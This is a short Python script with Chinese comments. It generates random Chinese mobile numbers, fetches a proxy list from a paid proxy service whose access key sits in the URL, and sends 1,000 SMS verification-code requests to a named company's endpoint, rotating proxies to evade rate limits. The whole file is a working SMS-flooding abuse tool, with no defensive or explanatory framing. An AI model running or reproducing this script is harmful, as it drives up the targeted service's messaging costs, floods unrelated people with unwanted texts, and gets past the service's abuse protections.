# !/usr/bin/env python
# -*- coding: utf-8 -*-
import io
import json
import random
import requests

headers = {
    'Accept': 'application/json',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39',
}


# 创建手机号
def createPhone():
    prelist = ["130", "131", "132", "133", "134", "135", "136", "137", "138", "139",
               "147", "150", "151", "152", "153", "155", "156", "157", "158", "159",
               "186", "187", "188", "189", "172", "176", "185"]
    eight = "".join(random.choice("0123456789") for i in range(8))
    phone = random.choice(prelist) + eight
    return phone


# 获取代理列表
def getProxyList():
    proxyList = []
    url = 'http://2507128400.v4.dailiyun.com/query.txt?key=NPX027197T&word=&count=1000&rand=false&ltime=0&norepeat=true&detail=false'
    r = requests.get(url, headers=headers)
    r.encoding = 'utf-8'
    l = r.text.split('\n')
    for i in l:
        proxyList.append(i.replace('\r', ''))
        # 这里只拿到IP加端口就行
    return proxyList


# 发送验证码
def sendCode(number, proxyList):
    proxies = {
        'http': '{}'.format(random.choice(proxyList))
    }
    print(proxies)
    url = 'https://www.aliboxx.com/sunlight/client/anno/sendMobileVerifyCode'

    data = {"type": 0, "mobile": number, "GR": "86"}
    try:
        res = requests.post(url, json=data, headers=headers, proxies=proxies, timeout=5).content.decode('utf-8')
        data = json.loads(res)['body']['status']
        with io.open('请求记录.txt', 'a+', encoding='utf-8') as f:
            f.write(number + data + '\n')  # 添加‘\n’用于换行
            f.close()  # 关闭文件
        print(data)
    except:
        print('请求时间超过5S~~~')


if __name__ == '__main__':
    proxyList = getProxyList()

    # 请求多少次
    for i in range(1000):
        number = createPhone()
        sendCode(number, proxyList)
